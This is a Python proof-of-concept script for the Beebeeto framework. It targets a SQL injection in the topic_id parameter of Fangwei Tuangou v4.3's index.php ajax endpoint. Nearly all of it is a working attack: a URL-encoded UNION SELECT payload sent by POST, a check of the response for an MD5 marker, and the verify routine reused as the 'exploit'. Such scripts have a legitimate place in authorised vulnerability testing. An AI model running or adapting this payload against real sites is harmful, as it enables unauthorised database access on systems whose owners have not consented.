#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0146',
            'name': '方维团购 v4.3 /index.php SQL注入漏洞 POC',
            'author': 'Noname',
            'create_date': '2015-09-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '方维团购',
            'vul_version': ['4.3'],
            'type': 'SQL Injection',
            'tag': ['方维团购4.3漏洞', 'SQL注入漏洞', '/index.php', 'php'],
            'desc': '方维团购 v4.3 /index.php?ctl=ajax&act=load_topic_reply_list，topic_id造成了注入',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-0122585'],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/index.php?ctl=ajax&act=load_topic_reply_list"
        post_data = 'topic_id=-1%20union%20select%0b1,2,3,md5(123456),5,6,7,8,9%23'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST PAYLOAD: ' + post_data
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req, post_data).read()
        if 'e10adc3949ba59abbe56e057f20f883e' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())